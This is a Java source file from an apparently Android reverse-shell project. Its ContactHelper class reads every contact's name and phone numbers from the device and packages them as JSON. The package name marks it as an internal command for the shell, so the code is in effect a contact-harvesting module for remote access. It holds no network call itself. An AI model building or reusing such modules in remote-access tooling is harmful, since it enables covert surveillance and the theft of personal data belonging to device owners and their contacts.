package com.anythingintellect.androidreverseshell.internalcmdutils;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.text.TextUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by ishan.dhingra on 21/12/16.
 */

public class ContactHelper {

    private static String NAME = Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB ?
            ContactsContract.Contacts.DISPLAY_NAME_PRIMARY :
            ContactsContract.Contacts.DISPLAY_NAME ;
    public static JSONArray fetchContact(Context context) {
        JSONArray contacts = new JSONArray();
        ContentResolver contentResolver = context.getContentResolver();
        Cursor contactCursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
        if (contactCursor != null) {
            if (contactCursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String contactName = contactCursor.getString(contactCursor.getColumnIndex(NAME));
                    try {
                        contact.put("name", contactName);
                        JSONArray phones = new JSONArray();
                        boolean hasPhone = contactCursor.getInt(contactCursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0;
                        if (hasPhone) {
                            int id = contactCursor.getInt
                                    (contactCursor.getColumnIndex(ContactsContract.Contacts._ID));
                            phones = fetchPhones(id, contentResolver);
                        }
                        contact.put("phone", phones);
                        contacts.put(contact);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                } while (contactCursor.moveToNext());
            }
            contactCursor.close();
        }
        return contacts;
    }

    private static JSONArray fetchPhones(int id, ContentResolver contentResolver) {
        JSONArray phones = new JSONArray();
        String selections = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?";
        String[] selectionArg = new String[]{String.valueOf(id)};
        Cursor phoneCursor = contentResolver.
                query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, selections, selectionArg, null);
        if (phoneCursor != null) {
            if (phoneCursor.moveToFirst()) {
                do {
                    String phone = phoneCursor.getString(
                            phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    phones.put(phone);
                } while (phoneCursor.moveToNext());
            }
            phoneCursor.close();
        }
        return phones;
    }

    private static String perpareSelection(String name) {
        String selection = "";
        if (!TextUtils.isEmpty(name)) {
            selection += Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB ?
                    ContactsContract.Contacts.DISPLAY_NAME_PRIMARY + " LIKE ? " :
                    ContactsContract.Contacts.DISPLAY_NAME + " LIKE ? ";
        }
        return selection;
    }
}
